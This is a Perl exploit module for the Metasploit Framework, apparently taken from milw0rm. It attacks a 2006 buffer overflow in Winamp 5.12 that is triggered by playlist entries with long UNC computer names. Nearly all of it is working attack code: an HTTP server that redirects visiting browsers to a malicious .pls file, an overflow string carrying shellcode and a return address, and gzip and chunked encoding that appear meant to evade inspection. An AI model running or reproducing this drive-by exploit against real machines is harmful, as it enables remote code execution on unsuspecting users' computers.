##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::winamp_playlist_unc;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;

 my $advanced =
  {
	'Gzip'       => [1, 'Enable gzip content encoding'],
	'Chunked'    => [1, 'Enable chunked transfer encoding'],
	'Humor'      => [0, 'Enable humorous song names'],
  };

my $info =
  {
	'Name'           => 'Winamp Playlist UNC Path Computer Name Overflow',
	'Version'        => '$Revision: 1.3 $',
	'Authors'        =>
	  [
		'H D Moore <hdm [at] metasploit.com',
		'Faithless <rhyskidd [at] gmail.com>',
	  ],

	'Description'    =>
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the Winamp media player.
	This flaw is triggered when a audio file path is specified, inside a
	playlist, that consists of a UNC path with a long computer name. This
	module delivers the playlist via the browser.
}),

	'Arch'           => [ 'x86' ],
	'OS'             => [ 'win32', 'winxp', 'win2003' ],
	'Priv'           => 0,

	'AutoOpts'       => { 'EXITFUNC' => 'process' },
	'UserOpts'       =>
	  {
		'HTTPPORT' => [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' => [ 0, 'HOST', 'The local HTTP listener host', "0.0.0.0" ],
	  	'REALHOST' => [ 0, 'HOST', 'External address to use for redirects (NAT)' ],
	  },

	'Payload'        =>
	  {
		'Space'    => 526,
		'BadChars' => "\x00\x5c\x2f\x0a\x0d\x20",
		'Keys'     => ['-bind'],
		
		# Landing on \x5c\x5c trashes esp, restore from ecx
		'PrependEncoder' => "\x87\xe1",
		
		# Disable nop sleds completely (dont modify ecx)
		'MinNops'  => 0,
		'MaxNops'  => 0,
	  },
	'Refs'           =>
	  [
	  	['BID', '16410'],
		['URL', 'http://milw0rm.com/id.php?id=1458/'],
		['URL', 'http://secunia.com/advisories/18649/'],		
	  ],

	'DefaultTarget'  => 0,
	'Targets'        =>
	  [
	  	# Return to exe, 0x0d is replaced by 0x00 >:-)
		[ 'Winamp 5.12 Universal', 0x0d45fece  ]
	  ],

	'Keys'           => [ 'winamp' ],

	'DisclosureDate' => 'Jan 29 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar('HTTPHOST'),
		LocalPort => $self->GetVar('HTTPPORT'),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar('HTTPPORT'));
		return;
	}

	my $httphost = $self->GetVar('HTTPHOST');
	$httphost = Pex::Utils::SourceIP('1.2.3.4') if $httphost eq '0.0.0.0';

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar('HTTPPORT') ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

	# Read the HTTP headers
	my $headers;
	while ( (my $line = $fd->RecvLine(10))) {
		$headers .= $line;
		last if $line eq "\r\n";
	}

	if ($url !~ /\.pls/i) {
		$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, redirecting...");
		my $content =
			"<html><script>".
			"document.location='".RandomPath().".pls'".
			"</script><body>".
			"One second please...</body></html>";	

		$fd->Send($self->BuildResponse($content));
		$fd->Close;
		return;
	}

	my $target_idx  = $self->GetVar('TARGET');
	my $target      = $self->Targets->[$target_idx];
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	
	my $name = Pex::Text::AlphaNumText(int(rand(32)+1));
	my $file = Pex::Text::AlphaNumText(1026);
	
	substr($file, 1022, 4, pack('V', $target->[1]));
	substr($file, 0, length($shellcode), $shellcode);
	
	# Too many and it takes too long to load...
	my $pcnt = int(rand(10)+10);
	my $play =
		"[playlist]\r\n".
			
			$self->RandomNames($pcnt).
			
			"File".   ($pcnt+1). "=\\\\$file\r\n" .
			"Title".  ($pcnt+1). "=$name\r\n".
			"Length". ($pcnt+1). "=".sprintf("%x",rand(1024)+1)."\r\n".
			
			"NumberOfEntries=".($pcnt+1)."\r\n". 
			"Version=2\r\n";

	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, sending ".length($shellcode)." bytes of payload...");


	$fd->Send($self->BuildResponse($play, "audio/x-scpls"));

	# Prevents IE from throwing an error in some cases
	select(undef, undef, undef, 0.1);

	$fd->Close();
}

sub RandomPath {
	my $self = shift;
	my $path;

	while (length($path) < 32) {
		$path .= "/" . Pex::Text::AlphaNumText(int(rand(30) + 5));
	}
	return $path;
}

sub RandomNames {
	my $self = shift;
	return $self->RandomNamesFun(@_) if $self->GetVar('Humor');
	my $scnt = shift;
	
	my $ppad = '';
	
	for my $idx (1..$scnt) {
		my $pname = Pex::Text::AlphaNumText(int(rand(32)+1));
		my $pfile = Pex::Text::AlphaNumText(int(rand(32)+1)).".mp3";
		$ppad .=
			"File".   ($idx). "=".$pfile."\r\n" .
			"Title".  ($idx). "=".$pname."\r\n".
			"Length". ($idx). "=".sprintf("%x",rand(1024)+1)."\r\n";	
	}
	return $ppad;
}

sub BuildResponse {
	my ($self, $content, $ctype) = @_;
	$ctype ||= "text/html";
	
	my $response =
	  "HTTP/1.1 200 OK\r\n" .
	  "Content-Type: $ctype\r\n";

	if ($self->GetVar('Gzip')) {
		$response .= "Content-Encoding: gzip\r\n";
		$content = $self->Gzip($content);
	}
	if ($self->GetVar('Chunked')) {
		$response .= "Transfer-Encoding: chunked\r\n";
		$content = $self->Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . "\r\n" .
		  "Connection: close\r\n";
	}

	$response .= "\r\n" . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . "\r\n$chunk\r\n";
	}
	$chunked .= "0\r\n\r\n";

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+10;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (<$rdr>);
}


sub RandomNamesFun {
	my $self = shift;
	my $scnt = shift;
	my @ffun = 
	(
		"Angelina vs Rosie O - Butter Time",	
		"Richards Gerbil Adventure",
		"Elton John Bachelor Party",
		"Paris Hilton Greased Chihuahua",
		"OH MY GOD",
		"SOMEONE IS OWNING",
		"MY WINAMP!",
	);
	
	my $ppad = '';
	
	for my $idx (1..$scnt) {
		my $pname = $ffun[ $idx % scalar(@ffun) ];
		$ppad .=
			"File".   ($idx). "=".$pname."\r\n" .
			"Title".  ($idx). "=".$pname."\r\n".
			"Length". ($idx). "=".sprintf("%x",rand(1024)+1)."\r\n";	
	}
	return $ppad;
}
1;

# milw0rm.com [2006-01-31]
